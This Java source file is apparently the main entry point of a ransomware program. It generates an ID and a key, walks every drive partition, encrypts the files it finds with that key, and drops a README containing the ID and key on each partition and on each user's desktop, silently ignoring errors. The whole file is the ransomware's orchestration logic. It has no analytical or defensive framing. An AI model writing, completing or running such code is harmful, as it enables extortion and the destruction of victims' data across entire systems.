package main;


import encryptionAndDecryption.Encryption;
import enums.To;
import files.CreateReadMeFile;
import files.GetFiles;
import genrators.GenerateID;
import genrators.GenerateKey;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;

public class Main {
    public static void main(String[] args) {
        String id = new GenerateID(20).getID();
        String key = new GenerateKey(16).getKye();
        CreateReadMeFile readMeFile = new CreateReadMeFile(id, key, 0.0f);
        GetFiles files = new GetFiles();

        // get partitions
        File[] partitions = files.getDrivers();
        for (File partition : partitions) {
            // Encryption files
            Encryption.encryption(files.scanFiles(partition, To.ENCRYPTION), key);
            // Create read me file
            try {
                readMeFile.create(partition.getPath());
            } catch (IOException ignored) {}

        }

        
        // Crete read me file in desktop
        ArrayList<File> desktops = files.getDesktops();
        for (File desktop: desktops) {
            System.out.println("desktop = " + desktop);
            try {
                readMeFile.create(desktop.toString());
            } catch (IOException ignored){}
        }
        

        // Test
//        File file = new File("tests/test.txt");
//        System.out.println(file.canRead());
//        EncryptionAndDecryption.encryptionAndDecryption(Cipher.ENCRYPT_MODE,"1234567891234567", file);
    }
}
